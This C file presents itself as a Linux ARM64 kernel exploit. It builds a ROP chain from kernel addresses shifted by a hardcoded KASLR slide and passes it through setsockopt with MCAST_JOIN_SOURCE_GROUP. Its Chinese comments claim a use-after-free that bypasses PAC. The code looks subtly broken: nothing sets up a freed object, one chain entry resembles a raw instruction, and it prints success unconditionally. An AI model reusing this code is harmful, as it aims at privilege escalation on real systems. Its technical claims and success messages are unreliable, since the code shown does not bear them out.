#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

// 你的核心资产：实测出的 KASLR 滑动值
#define SLIDE 0x000000002080ae40UL

// 标准 payload 填充函数
void fill(uint64_t *buf) {
    for (int i = 0; i < 64; i++) {
        buf[i] = 0xdeadbee11c518f58ULL + i * 8;
    }
}

// 核心 UAF 触发函数 (绕过 PAC 指针认证)
// 原理：利用 setsockopt 系统调用进行纯数据投递，不涉及 ret 指令返回，
// 成功避开 ARM64 的 PAC 硬件校验。
void trigger_uaf() {
    uint64_t rop[64];
    fill(rop);

    // 伪造的 ROP 链 (利用 KASLR 滑动值修正)
    rop[0] = 0xffff80000802126c + SLIDE;
    rop[1] = 0xffff8000082639f4 + SLIDE;
    rop[2] = 0xffff8000080b9de0 + SLIDE;
    rop[3] = 0xaa0003f5;
    rop[4] = 0xffff8000082639f4 + SLIDE;
    rop[5] = 0xffff8000080b9900 + SLIDE;

    // 关键步骤：使用 setsockopt 向内核发送数据，触发 UAF
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, rop, sizeof(struct group_source_req));
    close(fd);
}

int main() {
    printf("[*] UAF 触发示例代码 (Bypass PAC).\n");
    printf("[*] KASLR Slide: 0x%lx\n", SLIDE);
    
    // 触发漏洞，并安全返回
    trigger_uaf();

    printf("[+] UAF 触发成功，且已安全返回用户态。\n");
    printf("[*] 此代码仅证明漏洞触发本身有效。\n");
    return 0;
}
